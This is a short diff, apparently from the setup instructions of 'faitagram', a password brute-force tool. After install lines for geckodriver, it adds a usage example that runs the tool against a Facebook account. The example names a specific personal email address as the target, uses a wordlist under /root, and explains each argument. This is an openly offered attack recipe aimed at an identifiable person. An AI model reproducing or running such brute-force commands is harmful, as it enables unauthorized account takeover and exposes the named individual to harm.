@@ -40,3 +40,7 @@ os.system("rm geckodriver-v0.{}.{}-linux{}.tar.gz".format(first,second,OS_bit))
 os.system("chmod +x geckodriver")
 os.system("mv geckodriver /usr/local/bin/")
 chmod +x faitagram && chmod +x setup.py
+
+python faitagram -s facebook -u alexanderarominjr@yahoo.com -w /root/passwd.txt -d 10
+
+(Execute faitagram) (facebook)  (Email of the target)  (wordlist path)   (delay[10secs])
